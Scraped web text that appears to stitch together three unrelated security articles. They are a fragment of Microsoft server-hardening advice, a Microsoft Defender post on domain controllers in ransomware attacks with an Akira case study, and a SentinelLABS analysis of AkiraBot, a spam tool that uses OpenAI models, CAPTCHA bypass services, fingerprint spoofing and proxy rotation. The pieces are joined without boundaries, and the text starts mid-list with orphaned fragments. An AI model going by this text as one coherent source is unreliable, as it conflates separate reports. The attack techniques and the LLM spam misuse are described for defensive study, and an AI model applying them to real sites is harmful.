&lt;li&gt;&lt;strong&gt;Apply the latest security updates.&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;Identify and remediate vulnerabilities or misconfigurations in Exchange and SharePoint Server. Deploy the latest security updates as soon as they become available. Use&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-vulnerability-management/defender-vulnerability-management"&gt;threat and vulnerability management&lt;/a&gt;&amp;nbsp;to audit these servers regularly for vulnerabilities, misconfigurations, and suspicious activity.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Keep antivirus and other protections enabled. &lt;/strong&gt;It’s critical to protect SharePoint and Exchange servers with&amp;nbsp;&lt;a href="https://learn.microsoft.com/exchange/antispam-and-antimalware/windows-antivirus-software?view=exchserver-2019"&gt;antivirus software&lt;/a&gt;&amp;nbsp;and other security solutions like firewall protection and MFA.&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/enable-cloud-protection-microsoft-defender-antivirus"&gt;Turn on cloud-delivered protection&lt;/a&gt;&amp;nbsp;and automatic sample submission to use artificial intelligence and machine learning to quickly identify and stop new and unknown threats. Use&amp;nbsp;&lt;a href="https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference?ocid=magicti_ta_learndoc"&gt;attack surface reduction rules&lt;/a&gt;&amp;nbsp;to automatically block behaviors like credential theft and suspicious use of PsExec and WMI. Turn on&amp;nbsp;&lt;a href="https://techcommunity.microsoft.com/t5/Microsoft-Defender-ATP/Tamper-protection-now-generally-available-for-Microsoft-Defender/ba-p/911482"&gt;tamper protection&lt;/a&gt;&amp;nbsp;features to prevent attackers from stopping security services. If you are worried that these security controls will affect performance or disrupt operations, engage with IT pros to help determine the true impact of these settings. Security teams and IT pros should collaborate on applying mitigations and appropriate&amp;nbsp;&lt;a href="https://learn.microsoft.com/exchange/antispam-and-antimalware/windows-antivirus-software?view=exchserver-2019"&gt;settings&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Review sensitive roles and groups. &lt;/strong&gt;Review highly privileged groups like Administrators, Remote Desktop Users, and Enterprise Admins. Attackers add accounts to these groups to gain foothold on a server. Regularly review these groups for suspicious additions or removal. To identify Exchange/SharePoint -specific anomalies, review the list of users in sensitive roles.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Restrict access. &lt;/strong&gt;Practice the principle of least-privilege and maintain credential hygiene. Avoid the use of domain-wide, admin-level service accounts. Enforce&amp;nbsp;&lt;a href="https://learn.microsoft.com/security/privileged-access-workstations/overview#2-just-in-time-local-admin-passwords"&gt;strong randomized, just-in-time local administrator passwords&lt;/a&gt;&amp;nbsp;and Enable MFA. Use tools like&amp;nbsp;&lt;a href="https://technet.microsoft.com/en-us/mt227395.aspx"&gt;LAPS&lt;/a&gt;.&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Prioritize alerts.&lt;/strong&gt; The distinctive patterns of SharePoint and Exchange server compromise aid in detecting malicious behaviors and inform security operations teams to quickly respond to the initial stages of compromise. Pay attention to and immediately investigate alerts indicating suspicious activities. Catching attacks in the exploratory phase, the period in which attackers spend several days exploring the environment after gaining access, is key. Public facing application pools are commonly hijacked by attackers through web shell deployment. Prioritize alerts related to processes such as net.exe, cmd.exe, and powershell.exe originating from these pools or w3wp.exe in general.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;

These attacks, once characterized by sporadic and opportunistic attacks, have evolved into highly sophisticated, targeted campaigns aimed at causing maximum damage to organizations, with the average cost of a ransomware attack reaching $9.36 million in 2024.&lt;sup&gt;1&lt;/sup&gt; A key catalyst to this evolution is the rise of ransomware as a primary tool for financial extortion—an approach that hinges on crippling an organization’s operations by encrypting critical data and demanding a ransom for its release. &lt;a href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Microsoft Defender for Endpoint&lt;/a&gt;&amp;nbsp;disrupts ransomware attacks in an average of three minutes, only kicking in when more than 99.99% confident&amp;nbsp;in the presence of a cyberattack.&lt;/p&gt;

		&lt;/a&gt;
	&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Modern ransomware campaigns are meticulously planned. Cyberattackers understand that their chances of securing a ransom increase significantly if they can inflict widespread damage across a victim’s environment. The rationale is simple: paying the ransom becomes the most viable option when the alternative—restoring the environment and recovering data—is technically unfeasible, time-consuming, and costly. &lt;/p&gt;



&lt;p&gt;This level of damage happens in minutes and even seconds, where bad actors embed themselves within an organization’s environment, laying the groundwork for a coordinated cyberattack that can encrypt dozens, hundreds, or even thousands of devices within &lt;strong&gt;minutes&lt;/strong&gt;. To execute such a campaign, threat actors must overcome several challenges such as evading protection, mapping the network, maintaining their code execution ability, and preserving persistency in the environment, building their way to securing &lt;strong&gt;two major prerequisites&lt;/strong&gt; necessary to execute ransomware on multiple devices simultaneously:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;High-privilege accounts&lt;/strong&gt;: Whether cyberattackers choose to drop files and encrypt the devices locally or perform remote operations over the network, they must obtain the ability to authenticate to a device. In an on-premises environment, cyberattackers usually target domain admin accounts or other high-privilege accounts, as those can authenticate to the most critical resources in the environment.  &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Access to central network assets&lt;/strong&gt;: To execute the ransomware attack as fast and as wide as possible, threat actors aim to achieve access to a central asset in the network that is exposed to many endpoints. Thus, they can leverage the possession of high-privilege accounts and connect to all devices visible in their line of sight.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="the-role-of-domain-controllers-in-ransomware-campaigns"&gt;The role of domain controllers in ransomware campaigns&lt;/h2&gt;



&lt;p&gt;Domain controllers are the backbone of any on-premises environment, managing identity and access through Active Directory (AD). They play a pivotal role in enabling cyberattackers to achieve their goals by fulfilling two critical requirements: &lt;/p&gt;



&lt;h3 class="wp-block-heading" id="1-compromising-highly-privileged-accounts"&gt;1. Compromising highly privileged accounts&lt;/h3&gt;



&lt;p&gt;Domain controllers house the AD database, which contains sensitive information about all user accounts, including highly privileged accounts like domain admins. By compromising a domain controller, threat actors can: &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Extract password hashes&lt;/strong&gt;: Dumping the NTDS.dit file allows cyberattackers to obtain password hashes for every user account.  &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Create and elevate privileged accounts&lt;/strong&gt;: Cyberattackers can generate new accounts or manipulate existing ones, assigning them elevated permissions, ensuring continued control over the environment.  &lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;
  With these capabilities, cyberattackers can authenticate as highly privileged users, facilitating lateral movement across the network. This level of access enables them to deploy ransomware on a scale, maximizing the impact of their attack.
&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="2-exploiting-centralized-network-access"&gt;2. Exploiting centralized network access&lt;/h3&gt;



&lt;p&gt;
  Domain controllers handle crucial tasks like authenticating users and devices, managing user accounts and policies, and keeping the AD database consistent across the network. Because of these important roles, many devices need to interact with domain controllers regularly to ensure security, efficient resource management, and operational continuity. That&amp;#8217;s why domain controllers need to be central in the network and accessible to many endpoints, making them a prime target for cyberattackers looking to cause maximum damage with ransomware attacks.
&lt;/p&gt;



&lt;p&gt;
  Given these factors, it’s no surprise that domain controllers are frequently at the center of ransomware operations. Cyberattackers consistently target them to gain privileged access, move laterally, and rapidly deploy ransomware across an environment. We’ve seen in &lt;strong&gt;more than 78% of human-operated cyberattacks, threat actors successfully breach a domain controller&lt;/strong&gt;. Additionally, &lt;strong&gt;in more than 35% of cases, the primary spreader device—the system responsible for distributing ransomware at scale—is a domain controller,&lt;/strong&gt; highlighting its crucial role in enabling widespread encryption and operational disruption.
&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="case-study-ransomware-attack-using-a-compromised-domain-controller"&gt;Case study: Ransomware attack using a compromised domain controller&lt;/h2&gt;



&lt;p&gt;In one notable case, a small-medium manufacturer fell victim to a well-known, highly skilled threat actor attempting to execute a widespread Akira ransomware attack: &lt;/p&gt;


&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="How Microsoft Defender for Endpoint's automatic attack disruption helped contain a widespread ransomware attack." class="wp-image-138490 webp-format" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/SecurityBlog_Ransomwaregraphic-Edited-Slide-for-ransmoware-blog-2-1024x576.webp" /&gt;&lt;/figure&gt;



&lt;h3 class="wp-block-heading" id="pre-domain-compromise-activity"&gt;Pre domain-compromise activity&lt;/h3&gt;



&lt;p&gt;After gaining initial access, presumably through leveraging the customer’s VPN infrastructure, and prior to obtaining domain admin privileges, the cyberattackers initiated a series of actions focused on mapping potential assets and escalating privileges. A wide, remote execution of secrets dump is detected on &lt;a href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Microsoft Defender for Endpoint&lt;/a&gt;-onboarded devices and User 1 (domain user) is contained by attack disruption.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="post-domain-compromise-activity"&gt;Post domain-compromise activity&lt;/h3&gt;



&lt;p&gt;
  Once securing domain admin (User 2) credentials, potentially through leveraging the victim’s non-onboarded estate, the attacker immediately attempts to connect to the victim’s domain controller (DC1) using Remote Desktop Protocol (RDP) from the cyberattacker&amp;#8217;s controlled device. When gaining access to DC1, the cyberattacker leverages the device to perform the following set of actions:
&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Reconnaissance&lt;/strong&gt;—The cyberattacker leverages the domain controller’s wide network visibility and high privileges to map the network using different tools, focusing on servers and network shares.  &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Defense evasion&lt;/strong&gt;—Leveraging the domain controller’s native group policy functionality, the cyberattacker attempts to tamper with the victim’s antivirus by modifying security-related group policy settings.   &lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Persistence&lt;/strong&gt;—The cyberattacker leverages the direct access to Active Directory, creating new domain users (User 3 and User 4) and adding them to the domain admin group, thus establishing a set of highly privileged users that would later on be used to execute the ransomware attack.&lt;strong&gt; &lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="encryption-over-the-network"&gt;Encryption over the network&lt;/h3&gt;



&lt;p&gt;Once the cyberattacker takes control over a set of highly privileged users, this provides them access to any domain-joined resource, including comprehensive network access and visibility. It will also allow them to set up tools for the encryption phase of the cyberattack. &lt;/p&gt;



&lt;p&gt;Assuming they’re able to validate a domain controller&amp;#8217;s effectiveness, they begin by running the payload locally on the domain controller. Attack disruption detects the threat actor’s attempt to run the payload and contains User 2, User 3, and the cyberattacker-controlled device used to RDP to the domain controller. &lt;/p&gt;



&lt;p&gt;
  After successfully containing Users 2 and 3, the cyberattacker proceeded to log in to the domain controller using User 4, who had not yet been utilized. After logging into the device, the cyberattacker attempted to encrypt numerous devices over the network from the domain controller, leveraging the access provided by User 4. 
&lt;/p&gt;



&lt;p&gt;
  Attack disruption detects the initiation of encryption over the network and automatically granularly contains device DC1 and User 4, blocking the attempted remote encryption on all Microsoft Defender for Endpoint-onboarded and targeted devices. 
&lt;/p&gt;



&lt;div class="wp-block-buttons is-content-justification-center is-layout-flex wp-container-core-buttons-is-layout-4 wp-block-buttons-is-layout-flex"&gt;
&lt;div class="wp-block-button has-custom-width wp-block-button__width-75 btn-primary"&gt;&lt;a class="wp-block-button__link wp-element-button" href="https://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint"&gt;Help secure endpoints with Microsoft Defender for Endpoint&lt;/a&gt;&lt;/div&gt;
&lt;/div&gt;



&lt;h2 class="wp-block-heading" id="protecting-your-domain-controllers"&gt;Protecting your domain controllers&lt;/h2&gt;



&lt;p&gt;Given the central role of domain controllers in ransomware attacks, protecting them is critical to preventing large-scale damage. However, securing domain controllers is particularly challenging due to their fundamental role in network operations. Unlike other endpoints, domain controllers must remain highly accessible to authenticate users, enforce policies, and manage resources across the environment. This level of accessibility makes it difficult to apply traditional security measures without disrupting business continuity. Hence, security teams constantly face the complex challenge of striking the right balance between security and operational functionality. &lt;/p&gt;



&lt;p&gt;To address this challenge, Defender for Endpoint introduced contain high value assets (HVA), an expansion of our contain device capability designed to automatically contain HVAs like domain controllers in a granular manner. This feature builds on Defender for Endpoint’s capability to classify device roles and criticality levels to deliver a custom, role-based containment policy, meaning that if a sensitive device, such a domain controller, is compromised, it is immediately contained in less than three minutes, preventing the cyberattacker from moving laterally and deploying ransomware, while at the same time maintaining the operational functionality of the device. The ability of the domain controller to distinguish between malicious and benign behavior helps keep essential authentication and directory services up and running. This approach provides rapid, automated cyberattack containment without sacrificing business continuity, allowing organizations to stay resilient against sophisticated human-operated cyberthreats.&lt;/p&gt;



&lt;p&gt;Now your organization’s domain controllers can leverage automatic attack disruption as an extra line of defense against malicious actors trying to overtake high value assets and exert costly ransomware attacks. &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AkiraBot is a framework used to spam website chats and contact forms &lt;em&gt;en masse&lt;/em&gt; to promote a low-quality SEO service.&lt;/li&gt;
&lt;li&gt;SentinelLABS assesses that AkiraBot has targeted more than 400,000 websites and successfully spammed at least 80,000 websites since September 2024.&lt;/li&gt;
&lt;li&gt;The bot uses OpenAI to generate custom outreach messages based on the purpose of the website.&lt;/li&gt;
&lt;li&gt;The framework is modular and sophisticated compared to typical spam tools, employing multiple CAPTCHA bypass mechanisms &amp;amp; network detection evasion techniques.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Overview&lt;/h2&gt;
&lt;p&gt;Whenever a new form of digital communications becomes prevalent, actors inevitably adopt it for spam to try to profit from unsuspecting users. Email has been the perennial choice for spam delivery, but the prevalence of new communications platforms has expanded the spam attack surface considerably.&lt;/p&gt;
&lt;p&gt;This report explores AkiraBot, a Python framework that targets small to medium sized business website contact forms and chat widgets. AkiraBot is designed to post AI-generated spam messages tailored to the targeted website’s content that shill the services for a dubious Search Engine Optimization (SEO) network. The use of LLM-generated content likely helps these messages bypass spam filters, as the spam content is different each time a message is generated. The framework also rotates which attacker-controlled domain is supplied in the messages, further complicating spam filtering efforts.&lt;/p&gt;
&lt;p&gt;The bot creator has invested significant effort into evading CAPTCHA filters as well as avoiding network detections by relying on a proxy service generally marketed towards advertisers–though the service has had considerable interest and use by cybercriminal actors.&lt;/p&gt;
&lt;p&gt;AkiraBot is not related to the ransomware group Akira; this name was chosen due to the bot’s consistent use of domains that use “Akira” as the SEO service brand.&lt;/p&gt;
&lt;h2&gt;Script Execution and Website Feature Targeting&lt;/h2&gt;
&lt;p&gt;SentinelLABS identified several archives containing scripts related to this framework with file timestamps dating back to September 2024. The oldest archive refers to the bot as Shopbot, likely a reference to its targeting of websites using Shopify. As the tool evolved, the targeting expanded to include websites built using GoDaddy and Wix, as well as generic website contact forms, which includes websites built using Squarespace, and likely other technologies. These technologies are primarily used by small- to medium-sized businesses for their ease in enabling website development with integrations for eCommerce, website content management, and business service offerings.&lt;/p&gt;
&lt;p&gt;There are many versions of this tool with file timestamps in the archives indicating activity between September 2024 to present. Each version uses one of two hardcoded OpenAI API keys and the same proxy credentials and test sites, which links the archives despite the disparate naming conventions. We identified AkiraBot-related archives that had the following root directory names:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;bubble_working_clone&lt;/li&gt;
&lt;li&gt;fingerprints-server&lt;/li&gt;
&lt;li&gt;GoDaddy&lt;/li&gt;
&lt;li&gt;NextCaptcha and FastCaptcha&lt;/li&gt;
&lt;li&gt;NextCaptchaBot-v6&lt;/li&gt;
&lt;li&gt;override&lt;/li&gt;
&lt;li&gt;petar_bot&lt;/li&gt;
&lt;li&gt;shopbotpyv2&lt;/li&gt;
&lt;li&gt;SHOPIFY_SYSTEM_UPDATED&lt;/li&gt;
&lt;li&gt;updatedpybot&lt;/li&gt;
&lt;li&gt;wix&lt;/li&gt;
&lt;li&gt;wixbot&lt;/li&gt;
&lt;li&gt;WORKING_FOLDER&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Additionally, logs from the tool reveal that the operator ran it from the following paths, suggesting that they are most likely using Windows Server systems based on the Administrator username being the most prevalent:&lt;/p&gt;
&lt;pre&gt;
 	C:/Users/Administrator/Desktop/
 	C:/Users/Administrator/Downloads/
 	C:/Users/Usuario/Desktop/ - only appears in the archive named GoDaddy
&lt;/pre&gt;
&lt;p&gt;Originally, AkiraBot spammed website contact forms enticing the site owner to purchase SEO services. Newer versions of AkiraBot have also targeted the Live Chat widgets integrated into many websites, including Reamaze widgets.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117818" style="width: 929px;"&gt;&lt;img alt="_submit_old_website function in v14.py" class="size-full wp-image-117818" height="363" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_6.jpg" width="929" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117818"&gt;&lt;em&gt;_submit_old_website&lt;/em&gt; function in &lt;em&gt;v14.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The bot has a GUI that shows success metrics and lets the operator choose a target list to run against. The GUI lets the operator customize how many threads are running at once, a feature the bot uses to target many sites concurrently.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117827" style="width: 1002px;"&gt;&lt;img alt="AkiraBot GUI" class="size-full wp-image-117827" height="749" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_18.jpg" width="1002" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117827"&gt;AkiraBot GUI&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Spam Message Generation&lt;/h3&gt;
&lt;p&gt;Searching for websites referencing AkiraBot domains shows that the bot previously spammed websites in a way that the message was indexed by search engines.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117836" style="width: 669px;"&gt;&lt;img alt="Google search results containing useakira[.]com" class="size-full wp-image-117836" height="566" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_10.jpg" width="669" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117836"&gt;Google search results containing &lt;em&gt;useakira[.]com&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117824" style="width: 1208px;"&gt;&lt;img alt="Spam comment on website from 2023 and content from AkiraBot templates.txt file" class="size-full wp-image-117824" height="578" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_20.jpg" width="1208" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117824"&gt;Spam comment on website from 2023 and content from AkiraBot &lt;em&gt;templates.txt&lt;/em&gt; file&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;AkiraBot creates custom spam messages for targeted websites by processing a template that contains a generic outline of the type of message the bot should send.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117834" style="width: 1038px;"&gt;&lt;img alt="Spam message template" class="size-full wp-image-117834" height="342" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_12.jpg" width="1038" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117834"&gt;Spam message template&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The template is processed by a prompt sent to the OpenAI chat API to generate a customized outreach message based on the contents of the website. The OpenAI client uses model gpt-4o-mini and is assigned the role &amp;#8220;&lt;i&gt;You are a helpful assistant that generates marketing messages.&lt;/i&gt;&amp;#8221; and the prompt instructs the LLM to replace the variables &lt;code&gt;&amp;lt;WEBSITE_NAME&gt;&lt;/code&gt; and &lt;code&gt;&amp;lt;KEYWORD&gt;&lt;/code&gt; with the site name provided at runtime.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117832" style="width: 1186px;"&gt;&lt;img alt="AI Chat prompt from v10.py" class="size-full wp-image-117832" height="677" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_14.jpg" width="1186" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117832"&gt;AI Chat prompt from &lt;em&gt;v10.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The &lt;code&gt;&amp;lt;KEYWORD&gt;&lt;/code&gt; is generated by processing the &lt;code&gt;{context}&lt;/code&gt; variable, which contains text scraped from the targeted website via &lt;a href="https://www.crummy.com/software/BeautifulSoup/" target="_blank"&gt;BeautifulSoup&lt;/a&gt;, a library that transforms raw HTML code into human–or LLM–readable text.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117817" style="width: 1059px;"&gt;&lt;img alt="AkiraBot generate_message function" class="size-full wp-image-117817" height="680" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_7.jpg" width="1059" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117817"&gt;AkiraBot&amp;#8217;s &lt;em&gt;generate_message&lt;/em&gt; function&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The resulting message includes a brief description of the targeted website, making the message seem curated. The benefit of generating each message using an LLM is that the message content is unique and filtering against spam becomes more difficult compared to using a consistent message template which can trivially be filtered.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117835" style="width: 1059px;"&gt;&lt;img alt="Logged AI-generated outreach messages in submissions.csv" class="size-full wp-image-117835" height="670" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_11.jpg" width="1059" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117835"&gt;Logged AI-generated outreach messages in &lt;em&gt;submissions.csv&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;CAPTCHA Bypass &amp;amp; Network Evasion Techniques&lt;/h2&gt;
&lt;h3&gt;CAPTCHA Bypass&lt;/h3&gt;
&lt;p&gt;AkiraBot puts significant emphasis on evading CAPTCHAs so that it can spam websites at scale. The targeted CAPTCHA services include hCAPTCHA and reCAPTCHA, including Cloudflare’s hCAPTCHA service in certain versions of the tool.&lt;/p&gt;
&lt;p&gt;We identified an archive with files for CAPTCHA-related servers and browser fingerprints, which allow the bot’s web traffic to mimic a legitimate end user. The archives contain a fingerprint server that runs on the same system as the other AkiraBot tools and intercepts the website loading processes using Selenium &lt;a href="https://www.selenium.dev/documentation/webdriver/" rel="noopener noreferrer" target="_blank"&gt;WebDriver&lt;/a&gt;, an automation framework that simulates user browsing activity.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;inject.js&lt;/code&gt; script injects code into the targeted website’s Document Object Model (DOM) which enables the tool to modify how the website loads in real time and change behaviors. &lt;code&gt;inject.js&lt;/code&gt; manipulates values in the session via a headless Chrome instance that makes the session appear like an end user’s browser to the webserver. The script modifies multiple browser attributes that webservers use to identify the nature of the browser viewing the website, including:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Audio Context and Voice engines, which are used to profile whether a session is headless or a real browser&lt;/li&gt;
&lt;li&gt;Graphics rendering, including canvas and WebGL attributes&lt;/li&gt;
&lt;li&gt;Installed fonts&lt;/li&gt;
&lt;li&gt;&lt;a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator" rel="noopener noreferrer" target="_blank"&gt;Navigator&lt;/a&gt; objects, which provide a wealth of profiling information, such as browser type, operating system &amp;amp; architecture, geolocation, hardware details, languages installed, and browser privacy settings&lt;/li&gt;
&lt;li&gt;System memory, storage, and CPU profile&lt;/li&gt;
&lt;li&gt;Timezone&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;The bot uses several CAPTCHA bypassing services, including Capsolver, FastCaptcha, and NextCaptcha, which are failover services for when browser emulation is insufficient to interact with the targeted website.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117819" style="width: 1254px;"&gt;&lt;img alt="FastCaptcha token generator function in v10.py" class="size-full wp-image-117819" height="630" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_4.jpg" width="1254" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117819"&gt;FastCaptcha token generator function in &lt;em&gt;v10.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;AkiraBot also runs a headless Chrome instance to refresh values for &lt;a href="https://support.reamaze.com/kb/automation/enable-ai-spam-filtering-for-chat-and-email-channels" rel="noopener noreferrer" target="_blank"&gt;Reamaze&lt;/a&gt; tokens periodically. Reamaze provides websites with customer support chat integrations, making this another targeted feature. The service also offers spam filters for chats on its platform, indicating that this is a known vector for spam attacks.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117821" style="width: 736px;"&gt;&lt;img alt="Reamaze token handling function" class="size-full wp-image-117821" height="419" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_23.jpg" width="736" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117821"&gt;Reamaze token handling function&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h3&gt;Network Evasion Techniques&lt;/h3&gt;
&lt;p&gt;AkiraBot uses many different proxy hosts to evade network detections and diversify the source of where its traffic comes from. In each archive SentinelLABS analyzed, AkiraBot used the SmartProxy service. SmartProxy’s website claims that its proxies are ethically sourced and that they provide data center, mobile, and residential proxies. Each version of the bot uses the same proxy credentials, suggesting the same actor is behind each iteration.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117826" style="width: 649px;"&gt;&lt;img alt="get_random_proxy function in The_NextCaptcha_Bot.py" class="size-full wp-image-117826" height="288" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_19.jpg" width="649" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117826"&gt;&lt;em&gt;get_random_proxy&lt;/em&gt; function in &lt;em&gt;The_NextCaptcha_Bot.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;While SmartProxy is a service that seems to operate within legal boundaries, it is worth noting that it has regularly had the attention of cybercriminals. The BlackBasta ransomware leaks referenced an exchange of SmartProxy credentials, for example.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117828" style="width: 1216px;"&gt;&lt;img alt="SmartProxy credentials from BlackBasta leaks" class="size-full wp-image-117828" height="306" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_17.jpg" width="1216" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117828"&gt;SmartProxy credentials from BlackBasta leaks&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Logging &amp;amp; Success&lt;/h2&gt;
&lt;p&gt;AkiraBot logs its spam progress to &lt;code&gt;submissions.csv&lt;/code&gt;, which sometimes includes the AI-generated spam message contents as well. The &lt;code&gt;submissions.csv&lt;/code&gt; file from the January 2025 archives show more than 80,000 unique domains that were successfully spammed. The script also logs failed attempts in &lt;code&gt;failed.txt&lt;/code&gt; and &lt;code&gt;failed_old.txt&lt;/code&gt;. The January 2025 archives showed that only 11,000 domains had failed, including previous runs of the tool. We analyzed all &lt;code&gt;submissions.csv&lt;/code&gt; files; deduplicating the results revealed that more than 420,000 unique domains were targeted in total.&lt;/p&gt;
&lt;p&gt;Two versions of AkiraBot used a Telegram bot for logging success metrics. The scripts &lt;code&gt;monitor.py&lt;/code&gt; and &lt;code&gt;monitor_random.py&lt;/code&gt; would collect success metrics from the bot and post them to a Telegram channel via API.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117823" style="width: 853px;"&gt;&lt;img alt="Telegram sending functionality in monitor.py" class="size-full wp-image-117823" height="403" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_21.jpg" width="853" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117823"&gt;Telegram sending functionality in &lt;em&gt;monitor.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;h2&gt;Telegram Detail&lt;/h2&gt;
&lt;p&gt;The Telegram functionality, contained in the &lt;code&gt;monitor.py&lt;/code&gt; and &lt;code&gt;monitor_random.py&lt;/code&gt; scripts, is tied into proxy rotation and CAPTCHA defeat features contained within the bundled JavaScript file &lt;code&gt;script.js&lt;/code&gt;.  The &lt;code&gt;monitor.py&lt;/code&gt; script utilizes &lt;code&gt;pyautogui&lt;/code&gt; to paste the contents of &lt;code&gt;script.js&lt;/code&gt; into a browser developer console by scripting CTRL+SHIFT+J, followed by the paste command, eventually executing the JavaScript within the browser console.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_117837" style="width: 337px;"&gt;&lt;img alt="pyautogui actions in monitor.py" class="size-full wp-image-117837" height="369" src="https://www.sentinelone.com/wp-content/uploads/2025/04/AkiraBot_1.jpg" width="337" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-117837"&gt;&lt;em&gt;pyautogui&lt;/em&gt; actions in &lt;em&gt;monitor.py&lt;/em&gt;&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The pasted and executed JavaScript is then responsible for attempting CAPTCHA refreshes and defeats on targeted URLs, reporting the status returned to a JSON file, &lt;code&gt;stats.json&lt;/code&gt;. If a proxy rotation is required, to aid further in refreshing the CAPTCHA defeat attempts on a given URL, the &lt;code&gt;monitor.py&lt;/code&gt; script handles this as well, rotating the used proxy though the iproxyonline service (&lt;code&gt;fxdx[.]in&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Proxy rotation is generally enabled to avoid geographic or IP-based restrictions when repeatedly attempting to refresh and defeat CAPTCHAs. The Telegram status updates specifically report on proxy rotations and CAPTCHA submissions. Some versions of these scripts have the proxy rotation section commented out, indicating that it is an optional feature.&lt;/p&gt;
